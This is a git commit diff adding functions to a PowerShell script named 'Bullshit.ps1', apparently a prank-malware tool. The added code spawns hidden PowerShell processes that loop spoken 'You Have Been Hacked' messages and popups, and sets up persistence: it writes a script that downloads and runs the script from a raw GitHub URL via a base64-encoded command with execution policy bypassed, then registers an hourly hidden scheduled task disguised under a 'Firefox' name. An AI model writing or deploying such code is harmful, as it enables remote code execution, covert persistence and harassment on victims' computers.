21bfdbe6f4759c306f0ec6ae77214f1051405c42
EOLFML <166341840+EOLFML@users.noreply.github.com>
2024-05-15 18:45:08 +0200

    Update Bullshit.ps1

--- Bullshit.ps1
+++ Bullshit.ps1
@@ -10,4 +10,26 @@ function Get-Elevated {
 
 function Stop-bullshit {
     Get-process powershell | Stop-process
+    schtasks /delete /tn firefox\GetHacked
+}
+
+function Get-Hacked {
+    start-process powershell -WindowStyle hidden -ArgumentList '-WindowStyle hidden -command "Add-Type -AssemblyName System.speech; while ($true) { (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(''You Have Been Hackeddd, dretzer'') }"'
+    start-process powershell -WindowStyle hidden -ArgumentList $(while(1){(New-Object -ComObject wscript.shell).Popup("Get Hacked",0,"Powned",0x1)}) 
+}
+function get-persist {
+    Add-Content -Value @'
+$command = 'iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/EOLFML/RandomThings/main/Bullshit.ps1");All-Bullshit'
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+powershell -executionpolicy bypass -WindowStyle hidden -encodedcommand $encodedcommand 
+'@ -path $env:USERPROFILE\test.ps1
+    schtasks /create /tn "Firefox\GetHacked" /tr "powershell -executionpolicy bypass -windowstyle hidden -File %USERPROFILE%\test.ps1" /sc HOURLY /mo 1 /F
+
+}
+function All-Bullshit{
+    Get-Beep
+    Get-Elevated
+    get-Hacked
+    get-persist
 }
